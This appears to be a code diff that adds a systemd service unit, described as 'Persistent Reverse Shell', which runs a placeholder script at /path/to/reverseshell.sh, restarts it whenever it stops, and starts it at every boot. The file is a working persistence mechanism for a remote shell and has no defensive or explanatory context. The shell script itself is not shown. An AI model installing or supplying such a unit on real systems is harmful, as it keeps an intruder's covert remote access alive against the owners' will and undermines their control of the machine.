@@ -1,0 +1,11 @@
+[Unit]
+Description=Persistent Reverse Shell
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/path/to/reverseshell.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
